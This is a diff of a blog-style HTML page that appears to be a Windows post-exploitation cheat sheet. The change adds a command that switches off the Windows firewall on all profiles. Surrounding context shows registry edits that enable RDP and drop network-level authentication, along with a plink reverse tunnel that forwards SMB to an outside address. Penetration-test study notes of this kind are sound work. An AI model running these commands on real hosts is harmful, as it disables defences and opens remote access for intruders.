@@ -14,7 +14,7 @@
 <meta property="og:description" content="Host Info1234567versysteminfosysteminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;tasklist &#x2F;vc:\windows\system32\license.rtfc:\windows\system32\eula.txtwmic os get Caption, CSDVersi">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-07-08T09:38:31.000Z">
-<meta property="article:modified_time" content="2022-07-08T09:51:52.811Z">
+<meta property="article:modified_time" content="2022-07-12T22:22:36.621Z">
 <meta name="twitter:card" content="summary">
     
     
@@ -183,8 +183,8 @@
 </li>
 <li><p>RunAs</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /user:hostname\&lt;username&gt; explorer.exe</span><br></pre></td></tr></table></figure></li>
-<li><p>Disable Firewall</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh advfirewall firewall show rule all</span><br></pre></td></tr></table></figure>
+<li><p>Disable Firewall<br>Remember, windows firewall is implicit block all incoming and implicit allow all outgoing</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show state</span><br><span class="line">netsh firewall show config</span><br><span class="line">netsh advfirewall firewall show rule all</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>RDP</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Enable RDP</span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Old RDP ker cred login bullshit</span><br><span class="line">reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp” /v UserAuthentication /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br><span class="line"># Local Remote port forward Plink (Use to tunnel out RDP, SMB, etc. etc.)</span><br><span class="line">    plink.exe -l &lt;user&gt; -pw &lt;password&gt; 10.11.0.70 -R 9595:localhost:445</span><br></pre></td></tr></table></figure>
